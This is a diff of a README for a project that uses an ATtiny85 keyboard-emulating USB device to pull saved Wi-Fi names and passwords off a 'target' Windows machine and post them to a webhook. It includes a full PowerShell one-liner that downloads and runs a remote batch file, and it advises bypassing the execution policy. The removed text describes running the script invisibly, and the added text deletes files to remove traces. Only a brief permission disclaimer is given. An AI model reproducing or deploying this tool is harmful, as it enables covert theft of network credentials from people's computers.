@@ -1,4 +1,4 @@
-## Project: Automated Wi-Fi Info Extraction and Upload
+## Project: Automated Wi-Fi Info Extraction with ATtiny85
 
 ### Author: Easin Arafat (KingBOB)
 
@@ -6,75 +6,52 @@
 
 ### **Overview**
 
-This project automates the extraction of Wi-Fi SSIDs and passwords from a Windows machine and uploads the data to a local webhook hosted on XAMPP. The process is performed invisibly to the user.
+This project automates the process of extracting Wi-Fi information from a Windows machine using a single batch file (`trigger.bat`). The ATtiny85 USB device emulates a keyboard to execute the batch script, which performs the following tasks:
+
+1. Downloads all required files (`wifi_info.ps1`).
+2. Executes the PowerShell script to extract Wi-Fi data.
+3. Sends the data to a local webhook.
+4. Cleans up by deleting all temporary files.
 
 ---
 
-### **Prerequisites**
+### **Steps to Use**
 
-1. **XAMPP** :
+#### **1. Prepare the Environment**
 
-- Download and install [XAMPP](https://www.apachefriends.org/index.html).
-- Ensure Apache is running.
+- Host the batch file (`trigger.bat`) and the PowerShell script (`wifi_info.ps1`) on a GitHub repository or a web server.
+- Ensure the webhook (`webhook.php`) is set up and accessible on `http://localhost/webhook/webhook.php`.
 
-1. **Scripts** :
+#### **2. Test Manually**
 
-- Place `wifi_info.ps1` and `run_hidden.vbs` in a directory, e.g., `C:\Scripts`.
-
-1. **Webhook Setup** :
-
-- Create a directory `webhook` in XAMPP `htdocs`.
-- Save the `webhook.php` file in the `webhook` directory.
-
----
-
-### **Usage Instructions**
-
-#### 1. **Prepare the Environment**
-
-- Ensure both `wifi_info.ps1` and `run_hidden.vbs` are in the same directory (e.g., `C:\Scripts`).
-- Verify the local webhook (`http://localhost/webhook/webhook.php`) is accessible.
-
-#### 2. **Test Scripts Manually**
-
-1. Open PowerShell and navigate to the script directory:
-   ```powershell
-   cd C:\Scripts
+1. Open Command Prompt.
+2. Run the following command to execute `trigger.bat`:
+   ```cmd
+   powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/<your-repo>/trigger.bat' -OutFile %temp%\trigger.bat; Start-Process %temp%\trigger.bat"
    ```
-2. Run the PowerShell script manually:
-   ```powershell
-   powershell -ExecutionPolicy Bypass -File wifi_info.ps1
-   ```
-3. Double-click `run_hidden.vbs` to verify it executes the script invisibly.
+3. Verify that:
+   - The `wifi_info.ps1` script runs successfully.
+   - Data is sent to the webhook.
+   - Temporary files are deleted.
 
-#### 3. **Deploy with ATtiny85**
+#### **3. Deploy with ATtiny85**
 
-1. Program the ATtiny85 with the provided Arduino code.
-2. Plug the ATtiny85 into the target Windows machine.
-3. The ATtiny85 will simulate keyboard inputs to execute `run_hidden.vbs`, which runs `wifi_info.ps1` in the background.
-
----
-
-### **Results**
-
-- Extracted Wi-Fi information is saved and uploaded to the local webhook.
-- The data is organized in the following format:
-  ```
-  SSID: <Wi-Fi SSID>, Password: <Wi-Fi Password>
-  ```
-- Webhook saves the data to `htdocs/webhook` with filenames like:
-  ```
-  wifi_info_YYYYMMDD_HHMMSS.txt
-  ```
+- Program the ATtiny85 with the provided script.
+- Plug the ATtiny85 into the target machine.
+- It will:
+  1. Open CMD.
+  2. Download and execute `trigger.bat`.
 
 ---
 
 ### **Important Notes**
 
-1. This project must be executed in a **controlled environment** and with **explicit permission** .
-2. Ensure that administrative privileges are available for the PowerShell script.
-3. Adjust any delays in the ATtiny85 script if needed to match system performance.
+1. Use this project only in a controlled environment or with explicit permission.
+2. Ensure PowerShell execution policy is not restricted (`ExecutionPolicy Bypass`).
+3. Test thoroughly in a sandbox or virtual machine before deployment.
 
 ---
 
-**Author** : Easin Arafat (KingBOB)
+### **Author**
+
+Easin Arafat (KingBOB)
